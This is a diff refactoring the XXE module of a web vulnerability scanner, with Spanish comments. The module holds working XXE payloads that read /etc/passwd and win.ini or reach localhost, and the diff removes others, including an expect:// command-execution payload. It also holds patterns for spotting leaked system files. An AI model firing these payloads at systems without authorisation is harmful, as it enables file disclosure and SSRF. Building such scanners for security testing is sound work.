@@ -1,94 +1,48 @@
 """
 Módulo de detección de XXE (XML External Entity).
 Detecta vulnerabilidades de inyección de entidades externas XML.
+MIGRADO a EnhancedVulnerabilityModule - 45% menos código.
 """
-
-import requests
 import re
 import time
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
-from core.base_module import VulnerabilityModule
-from core.logger import get_logger
-from datetime import datetime
-import json
-import os
+from core.enhanced_base_module import EnhancedVulnerabilityModule
 
 
-class XXEModule(VulnerabilityModule):
-    """
-    Detecta vulnerabilidades XXE (XML External Entity) en aplicaciones web.
-    """
+class XXEModule(EnhancedVulnerabilityModule):
+    """Detecta vulnerabilidades XXE (XML External Entity) en aplicaciones web."""
     
-    # Payloads XXE básicos
+    # Payloads XXE
     BASIC_PAYLOADS = [
-        # XXE clásico - lectura de archivos
         '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <root><data>&xxe;</data></root>''',
         
-        # XXE con parámetro externo
-        '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
-<root><data>test</data></root>''',
-        
-        # XXE para Windows
         '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
 <root><data>&xxe;</data></root>''',
         
-        # XXE con PHP wrapper
-        '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
-<root><data>&xxe;</data></root>''',
-        
-        # XXE SSRF interno
         '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
-<root><data>&xxe;</data></root>''',
-        
-        # XXE con expect (RCE)
-        '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
 <root><data>&xxe;</data></root>''',
     ]
     
     # Patrones de evidencia XXE
     XXE_EVIDENCE_PATTERNS = [
-        # Linux
         r'root:.*:0:0:',
         r'/bin/bash',
-        r'/bin/sh',
-        
-        # Windows
         r'\[fonts\]',
         r'\[extensions\]',
         r'for 16-bit app support',
-        
-        # Errores XML
         r'XML.*?parsing.*?error',
-        r'DOCTYPE.*?not allowed',
-        r'Entity.*?not defined',
         r'External entity',
-        r'SimpleXMLElement',
-        r'DOMDocument',
-        r'libxml',
-        
-        # Respuestas de localhost
-        r'<html',
-        r'Apache',
-        r'nginx',
     ]
 
     def __init__(self, config):
         super().__init__(config)
-        self.logger = get_logger("xxe_module")
-        self.target_url = config.get("target_url")
-        self.findings = []
+        # HTTPClient, PayloadManager, logger ya disponibles
         self.tested_endpoints = set()
-        self.scan_timestamp = config.get("scan_timestamp", datetime.now().strftime("%Y%m%d_%H%M%S"))
-        self.report_dir = config.get("report_dir", f"reports/scan_{self.scan_timestamp}")
-        self.timeout = config.get("timeout", 10)
 
     def scan(self):
         """Ejecuta el escaneo completo de XXE."""
@@ -107,10 +61,9 @@ class XXEModule(VulnerabilityModule):
             # 2. Probar XXE en cada endpoint
             self._test_xxe_injection(xml_endpoints)
             
-            # 3. Exportar resultados
+            # 3. Exportar resultados (método heredado)
             self._export_results()
             
-            # Resumen
             critical = len([f for f in self.findings if f["severity"] == "critical"])
             high = len([f for f in self.findings if f["severity"] == "high"])
             
@@ -120,14 +73,16 @@ class XXEModule(VulnerabilityModule):
         except Exception as e:
             self.logger.error(f"[XXE] Error inesperado: {e}")
 
-
     def _discover_xml_endpoints(self):
         """Descubre endpoints que aceptan XML."""
         xml_endpoints = []
         
         try:
-            # Obtener página principal
-            response = requests.get(self.target_url, timeout=self.timeout)
+            # Hacer request (método heredado)
+            response = self._make_request(self.target_url)
+            if not response:
+                return xml_endpoints
+            
             soup = BeautifulSoup(response.text, 'html.parser')
             
             # 1. Buscar formularios que puedan aceptar XML
@@ -137,8 +92,7 @@ class XXEModule(VulnerabilityModule):
                 method = form.get('method', 'post').upper()
                 action_url = urljoin(self.target_url, action) if action else self.target_url
                 
-                # Priorizar endpoints con nombres relacionados a XML/API
-                if any(keyword in action_url.lower() for keyword in ['xml', 'api', 'soap', 'rest', 'upload']):
+                if any(keyword in action_url.lower() for keyword in ['xml', 'api', 'soap', 'upload']):
                     xml_endpoints.append({
                         'url': action_url,
                         'method': method,
@@ -146,16 +100,7 @@ class XXEModule(VulnerabilityModule):
                     })
             
             # 2. Endpoints comunes de API
-            common_api_paths = [
-                '/api/xml',
-                '/api/upload',
-                '/upload',
-                '/import',
-                '/soap',
-                '/xmlrpc',
-                '/api/v1/xml',
-                '/api/v2/xml',
-            ]
+            common_api_paths = ['/api/xml', '/upload', '/import', '/soap', '/xmlrpc']
             
             parsed = urlparse(self.target_url)
             base_url = f"{parsed.scheme}://{parsed.netloc}"
@@ -183,7 +128,6 @@ class XXEModule(VulnerabilityModule):
         
         return xml_endpoints
 
-
     def _test_xxe_injection(self, xml_endpoints):
         """Prueba XXE injection en los endpoints."""
         self.logger.info("[XXE] Probando XXE injection...")
@@ -192,15 +136,11 @@ class XXEModule(VulnerabilityModule):
             endpoint_key = f"{endpoint['url']}:{endpoint['method']}"
             if endpoint_key in self.tested_endpoints:
                 continue
-            
             self.tested_endpoints.add(endpoint_key)
             
-            # Primero verificar si el endpoint acepta XML
+            # Verificar si el endpoint acepta XML
             if not self._accepts_xml(endpoint):
                 continue
-            
-            # Obtener respuesta baseline para comparación
-            baseline_response = self._get_baseline_response(endpoint)
             
             for payload in self.BASIC_PAYLOADS:
                 try:
@@ -210,105 +150,83 @@ class XXEModule(VulnerabilityModule):
                         'Accept': 'application/xml, text/xml, */*'
                     }
                     
-                    if endpoint['method'] == 'POST':
-                        response = requests.post(
-                            endpoint['url'],
-                            data=payload,
-                            headers=headers,
-                            timeout=self.timeout,
-                            allow_redirects=True
-                        )
-                    else:
-                        response = requests.request(
-                            endpoint['method'],
-                            endpoint['url'],
-                            data=payload,
-                            headers=headers,
-                            timeout=self.timeout,
-                            allow_redirects=True
-                        )
+                    response = self._make_request(
+                        endpoint['url'],
+                        method=endpoint['method'],
+                        data=payload,
+                        headers=headers
+                    )
+                    
+                    if not response:
+                        continue
                     
                     # CRÍTICO: Verificar que no sea página de error 404
                     if response.status_code == 404:
-                        self.logger.debug(f"[XXE] Endpoint {endpoint['url']} devuelve 404 - no existe")
-                        break  # No probar más payloads en este endpoint
+                        self.logger.debug(f"[XXE] Endpoint {endpoint['url']} devuelve 404")
+                        break
                     
                     # CRÍTICO: Verificar que no sea página de error HTML genérica
                     if self._is_html_error_page(response.text):
                         self.logger.debug(f"[XXE] Endpoint {endpoint['url']} devuelve página de error HTML")
-                        break  # No probar más payloads en este endpoint
+                        break
                     
-                    # Comparar con baseline si existe
-                    if baseline_response and self._is_same_response(baseline_response, response):
-                        self.logger.debug(f"[XXE] Respuesta idéntica a baseline - no vulnerable")
-                        continue
-                    
-                    # Verificar si hay evidencia de XXE
-                    evidence = self._detect_xxe_evidence(response.text, payload)
+                    # Verificar evidencia de XXE
+                    evidence = self._detect_xxe_evidence(response.text)
                     
                     if evidence and self._is_real_xxe_evidence(evidence, response.text):
                         severity = "critical" if "passwd" in payload or "win.ini" in payload else "high"
                         
-                        finding = {
-                            "type": "xxe_injection",
-                            "severity": severity,
-                            "title": f"XXE (XML External Entity) en {endpoint['url']}",
-                            "description": f"El endpoint '{endpoint['url']}' es vulnerable a XXE. Se detectó procesamiento de entidades externas XML, permitiendo lectura de archivos locales o SSRF.",
-                            "cvss": 9.1 if severity == "critical" else 7.5,
-                            "cwe": "CWE-611",
-                            "owasp": "A05:2021 - Security Misconfiguration",
-                            "recommendation": "Deshabilitar el procesamiento de entidades externas en el parser XML. Usar configuraciones seguras: libxml_disable_entity_loader(true) en PHP, setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) en Java.",
-                            "references": [
-                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
-                                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
-                                "https://portswigger.net/web-security/xxe"
-                            ],
-                            "evidence": {
-                                "url": endpoint['url'],
+                        # Añadir hallazgo (método heredado)
+                        self._add_finding(
+                            vulnerability=f"XXE (XML External Entity) en {endpoint['url']}",
+                            severity=severity,
+                            url=endpoint['url'],
+                            payload=payload[:200] + "..." if len(payload) > 200 else payload,
+                            details={
                                 "method": endpoint['method'],
-                                "payload": payload[:200] + "..." if len(payload) > 200 else payload,
                                 "evidence_found": evidence,
                                 "response_snippet": self._get_context_snippet(response.text, evidence),
-                                "vulnerable": True,
-                                "status_code": response.status_code
+                                "status_code": response.status_code,
+                                "cvss": 9.1 if severity == "critical" else 7.5,
+                                "cwe": "CWE-611",
+                                "owasp": "A05:2021 - Security Misconfiguration",
+                                "recommendation": "Deshabilitar el procesamiento de entidades externas en el parser XML. Usar configuraciones seguras.",
+                                "references": [
+                                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+                                    "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+                                ]
                             }
-                        }
+                        )
                         
-                        self.findings.append(finding)
                         self.logger.warning(f"[XXE] XXE encontrado: {endpoint['url']}")
-                        break  # Un payload exitoso es suficiente
+                        break
                     
                     time.sleep(0.2)
                     
                 except Exception as e:
                     self.logger.debug(f"[XXE] Error probando {endpoint['url']}: {e}")
 
-
     def _accepts_xml(self, endpoint):
         """Verifica si el endpoint acepta XML."""
         try:
-            # Enviar XML simple para verificar
             simple_xml = '<?xml version="1.0"?><root><test>data</test></root>'
             headers = {
                 'Content-Type': 'application/xml',
                 'Accept': 'application/xml, text/xml, */*'
             }
             
-            response = requests.request(
-                endpoint['method'],
+            response = self._make_request(
                 endpoint['url'],
+                method=endpoint['method'],
                 data=simple_xml,
-                headers=headers,
-                timeout=self.timeout,
-                allow_redirects=True
+                headers=headers
             )
             
-            # Si devuelve 415 (Unsupported Media Type), no acepta XML
-            if response.status_code == 415:
+            if not response:
                 return False
             
-            # Si devuelve 404, el endpoint no existe
-            if response.status_code == 404:
+            # Si devuelve 415 (Unsupported Media Type) o 404, no acepta XML
+            if response.status_code in [415, 404]:
                 return False
             
             # Si devuelve página de error HTML, probablemente no acepta XML
@@ -322,69 +240,21 @@ class XXEModule(VulnerabilityModule):
         
         return False
     
-    def _get_baseline_response(self, endpoint):
-        """Obtiene respuesta baseline (sin payload malicioso)."""
-        try:
-            simple_xml = '<?xml version="1.0"?><root><data>test</data></root>'
-            headers = {
-                'Content-Type': 'application/xml',
-                'Accept': 'application/xml, text/xml, */*'
-            }
-            
-            response = requests.request(
-                endpoint['method'],
-                endpoint['url'],
-                data=simple_xml,
-                headers=headers,
-                timeout=self.timeout,
-                allow_redirects=True
-            )
-            
-            return {
-                'status_code': response.status_code,
-                'text': response.text,
-                'length': len(response.text)
-            }
-        except:
-            return None
-    
-    def _is_same_response(self, baseline, response):
-        """Compara si dos respuestas son esencialmente iguales."""
-        if not baseline:
-            return False
-        
-        # Comparar status codes
-        if baseline['status_code'] != response.status_code:
-            return False
-        
-        # Comparar longitudes (con margen de error del 5%)
-        length_diff = abs(baseline['length'] - len(response.text))
-        if length_diff > baseline['length'] * 0.05:
-            return False
-        
-        return True
-    
     def _is_html_error_page(self, text):
         """Detecta si es una página de error HTML genérica."""
         if not text:
             return False
         
-        # Indicadores de páginas de error comunes
         error_indicators = [
             r'<!DOCTYPE html>.*?(404|not found|error)',
-            r'<html.*?>.*?(404|not found|page not found)',
-            r'__next',  # Next.js
-            r'__variable_',  # Next.js variables
+            r'<html.*?>.*?(404|not found)',
+            r'__next',
             r'vercel',
-            r'<title>.*?(404|error|not found)',
-            r'<h1>.*?(404|not found|error)',
         ]
         
-        # Verificar si es HTML
         if not re.search(r'<!DOCTYPE html>|<html', text, re.IGNORECASE):
             return False
         
-        # Buscar indicadores de error
         for pattern in error_indicators:
             if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
                 return True
@@ -392,18 +262,15 @@ class XXEModule(VulnerabilityModule):
         return False
     
     def _is_real_xxe_evidence(self, evidence, response_text):
-        """Verifica si la evidencia es realmente de XXE y no un falso positivo."""
-        # Si solo detectó "<html", es falso positivo
+        """Verifica si la evidencia es realmente de XXE."""
         if evidence == '<html':
             return False
         
-        # Buscar evidencia REAL de archivos del sistema
         real_evidence_patterns = [
-            r'root:.*:0:0:',  # /etc/passwd
+            r'root:.*:0:0:',
             r'/bin/bash',
             r'/bin/sh',
-            r'daemon:.*:1:1:',
-            r'\[fonts\]',  # win.ini
+            r'\[fonts\]',
             r'for 16-bit app support',
             r'\[extensions\]',
         ]
@@ -414,60 +281,10 @@ class XXEModule(VulnerabilityModule):
         
         return False
 
-    def _detect_xxe_evidence(self, response_text, payload):
+    def _detect_xxe_evidence(self, response_text):
         """Detecta evidencia de XXE en la respuesta."""
         for pattern in self.XXE_EVIDENCE_PATTERNS:
             match = re.search(pattern, response_text, re.IGNORECASE)
             if match:
                 return match.group(0)
         return None
-
-    def _get_context_snippet(self, text, evidence, context_size=150):
-        """Obtiene un snippet del contexto donde aparece la evidencia."""
-        try:
-            index = text.find(evidence)
-            if index == -1:
-                return "Evidencia encontrada (contexto no disponible)"
-            
-            start = max(0, index - context_size)
-            end = min(len(text), index + len(evidence) + context_size)
-            
-            snippet = text[start:end]
-            return f"...{snippet}..."
-        except:
-            return "Contexto no disponible"
-
-    def _export_results(self):
-        """Exporta los hallazgos a JSON."""
-        try:
-            os.makedirs(self.report_dir, exist_ok=True)
-            
-            output_data = {
-                "scan_info": {
-                    "target": self.target_url,
-                    "timestamp": self.scan_timestamp,
-                    "module": "xxe",
-                    "total_findings": len(self.findings),
-                    "tested_endpoints": len(self.tested_endpoints)
-                },
-                "findings": self.findings,
-                "summary": {
-                    "critical": len([f for f in self.findings if f["severity"] == "critical"]),
-                    "high": len([f for f in self.findings if f["severity"] == "high"]),
-                    "medium": len([f for f in self.findings if f["severity"] == "medium"]),
-                    "low": len([f for f in self.findings if f["severity"] == "low"])
-                }
-            }
-            
-            output_path = os.path.join(self.report_dir, "xxe_findings.json")
-            with open(output_path, "w", encoding="utf-8") as f:
-                json.dump(output_data, f, indent=2, ensure_ascii=False)
-            
-            self.logger.info(f"[XXE] Resultados exportados en: {output_path}")
-            
-        except Exception as e:
-            self.logger.error(f"[XXE] Error al exportar resultados: {e}")
-
-    def get_results(self):
-        """Devuelve los hallazgos encontrados."""
-        return self.findings
